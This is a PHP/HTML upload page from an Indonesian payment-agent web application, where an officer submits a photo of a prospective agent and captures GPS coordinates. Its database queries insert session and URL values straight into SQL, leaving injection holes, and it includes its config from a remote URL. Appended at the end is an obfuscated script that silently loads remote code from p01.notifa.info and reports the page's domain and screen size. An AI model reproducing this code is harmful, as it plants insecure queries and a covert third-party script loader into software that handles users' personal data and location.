<!DOCTYPE html>
<?php
@session_start();
include "http://202.78.202.235:2018/config/koneksi.php";
 if(@$_SESSION['admin'] || @$_SESSION['executor']|| @$_SESSION['approv']|| @$_SESSION['create']) {
?>

<?php
if(@$_SESSION['admin']) {
  $userlogin = @$_SESSION['admin'];
  $href="http://202.78.202.235:2018/admin/index.php";

 } else if(@$_SESSION['executor']) {
  $userlogin = @$_SESSION['executor'];
  $href="http://202.78.202.235:2018/user/Executor/index.php";

 } else if(@$_SESSION['approv']) {
  $userlogin = @$_SESSION['approv'];
  $href="http://202.78.202.235:2018/user/Approval/index.php";

 }else{
  $userlogin = @$_SESSION['create'];
  $href="http://202.78.202.235:2018/user/AO/index.php";
 }

 $sql = mysqli_query($con,"select * from user where username = '$userlogin'") or die (mysql_error());
 $data = mysqli_fetch_array($sql);
?>

<html>
    <head>
    <meta charset="utf-8">
  <meta name="viewport" content="width = device-width, initial-scale = 1">
  <!-- Chrome, Firefox OS and Opera -->
  <meta name="theme-color" content="#000">
  <!-- Windows Phone -->
  <meta name="msapplication-navbutton-color" content="#000">
  <!-- iOS Safari -->
  <meta name="apple-mobile-web-app-status-bar-style" content="#000">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width = device-width, initial-scale = 1">
        <title>Upload</title>

        <!--Style-->
        <link rel="stylesheet" type="text/css" href="http://202.78.202.235:2018/config/css/bootstrap.min.css">
        <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
        <link rel="stylesheet" type="text/css" href="http://202.78.202.235:2018/config/css/style.css">
        <link rel="stylesheet" type="text/css" href="http://202.78.202.235:2018/config/css/admin.css">
        <link rel="shorcut icon" href="http://202.78.202.235:2018/config/img/logo.png">
      
        <script type="text/javascript" src="http://202.78.202.235:2018/config/js/jquery.js"></script>
        <script type="text/javascript" src="http://202.78.202.235:2018/config/js/bootstrap.min.js"></script>
        <script type="text/javascript" src="http://202.78.202.235:2018/config/js/script.js"></script>

        <!--Datepicker-->
        <link href="http://202.78.202.235:2018/config/colorlib-regform-4/vendor/mdi-font/css/material-design-iconic-font.min.css" rel="stylesheet" media="all">
         <!-- Vendor CSS-->
        <link href="http://202.78.202.235:2018/config/colorlib-regform-4/vendor/select2/select2.min.css" rel="stylesheet" media="all">
        <link href="http://202.78.202.235:2018/config/colorlib-regform-4/vendor/datepicker/daterangepicker.css" rel="stylesheet" media="all">
        <!-- Main CSS-->
        <!--Datepicker Close-->

    </head>
    <body>
    <div id="preloader">
      <div id="status">&nbsp;</div>
    </div> 

<nav class="navbar navbar-default navbar-custom">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand"><img src="http://202.78.202.235:2018/config/img/logo.png" alt=""></a>
      </div>
      <div class="navbar-collapse collapse">
        <ul class="nav navbar-nav navbar-left">
          <li><a href="http://202.78.202.235:2018/user/AO">Halaman Depan</a></li>
          <li><a href="http://202.78.202.235:2018/user/AO/member.php?id=<?php echo $data['id'];?>">Daftar Agen Ku</a></li>
          <li><a href="http://202.78.202.235:2018/user/AO/waiting.php?id=<?php echo $data['id'];?>">Antrian</a></li>
          <li><a href="http://202.78.202.235:2018/user/AO/reject.php?id=<?php echo $data['id'];?>">Ditolak</a></li>
        </ul>
        <ul class="nav navbar-nav navbar-right">
          <li><a>Hi, <?php echo $data['nama']; ?></a></li>
          <li><a href="http://202.78.202.235:2018/config/logout.php">Keluar &nbsp;<i class="fa fa-sign-out"></i></a></li>
        </ul>
      </div>
    </nav>

      </div> <!--ROW-->
    </div> <!--BOX-->
    </div> <!--container-fluid-->

    <div class="container-fluid">
         <div class="jumbotron-list">
           <h2 class="text-center">Foto Bersama Calon Agen & Tempat Usaha</h2>
       </div>
     </div>
     <?php
  include ("http://202.78.202.235:2018/config/koneksi.php");
  $id=$_GET['id'];
  $query=mysqli_query($con,"SELECT * FROM  member where id_member='$id'");
  while($row=mysqli_fetch_array($query)){
  ?>

<!--Welcome-->
        <div class="container-fluid">
      <div class="col-md-12">
        <div class="form-content tambah">
          <form action="http://202.78.202.235:2018/user/AO/p_up3.php?id=<?php echo $row['id_member']; ?>" method="post" enctype="multipart/form-data">
              <center><label>----- Kirim Foto -----</label></center>
              <br>
             
              <div class="form-group">
                <input type="hidden" class="form-control " name="status" value="Waiting" >
              </div>
              
              <div class="form-group">
                <input type="file" class="form-control " name="member_Pict4" required>
              </div>
              <br>
              <center><i>*Klik kotak di bawah </i></center>
              <div class="form-group">
              <center> <a href="#" style="color:Black;" onclick="getLocation()">  [ Ambil Titik Koordinat ] </a></center>
              
              <br>
<p id="demo"></p>

<script>
var x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}

function showPosition(position) {
  x.innerHTML = "<input class=form-control name=latlong value= " + position.coords.latitude + 
  "," + position.coords.longitude +" required>"; 
}
</script>
 </div>
              

              <button type="submit" class="btn">Kirim</button>
          </form>
        </div>
      </div>
    </div>
    <?php
}
?>
    <footer>
    <p>Copyright &copy; PT.Mitra Pembayan Elektronik</p>
    </footer>
    <!-- Jquery JS-->
     <script src="http://202.78.202.235:2018/config/colorlib-regform-4/vendor/jquery/jquery.min.js"></script>
    <!-- Vendor JS-->
    <script src="http://202.78.202.235:2018/config/colorlib-regform-4/vendor/select2/select2.min.js"></script>
    <script src="http://202.78.202.235:2018/config/colorlib-regform-4/vendor/datepicker/moment.min.js"></script>
    <script src="http://202.78.202.235:2018/config/colorlib-regform-4/vendor/datepicker/daterangepicker.js"></script>

    <!-- Main JS-->
    <script src="http://202.78.202.235:2018/config/colorlib-regform-4/js/global.js"></script>

    <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdtBd4vmaO8100xB73L6tocBWcxOcZPumX%2b1Y2YXpnZkerbosW8CgUflhOlbVLyDt6zftDsnm6%2bmjbn3twEPpj9v%2bJrbpSGjh%2bTJx4KkYc0BPbDabAAE3nFvWbO%2bDO6BJCvOaVuLg7mjiPawF55FNcUh7GSxSVHApS55%2bopV6FOKsVM0gCyucCzXs1jKutqFzciy9nQGadwT2P0%2bnyvQV1Hf%2f0wfjxKo6p6ekbbxgWvCQmFdkURABCcFy%2bdnt2PJe3sKRTakFgvFA3QN0jp%2bO3M6afB7yqq1kYotqbNsxWcXEnhYrprtKPm82Q5GwiU%2fKTcWKAZK%2b%2bQyfrYy%2bqbPZUBfKptI1cg2FOyALVoFfce17eH5K0KetvMyHYu0auDjdaW8xHizFGGcPHtbQRhvrslw%2fSeyndHPRwwB%2bKetlvILjwYnm%2bRdPdIJ2EzPD5mF71YWecxqYlvg7AD30gA65BNN6Im84szUymli0KHyKf0LPUtGwY1IA9wdPdKqTwWbtA0nzv2gW2WnzSlUkGQKDomban1f%2f3WXjY" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
  
    </body>
</html>
<?php
}
?>
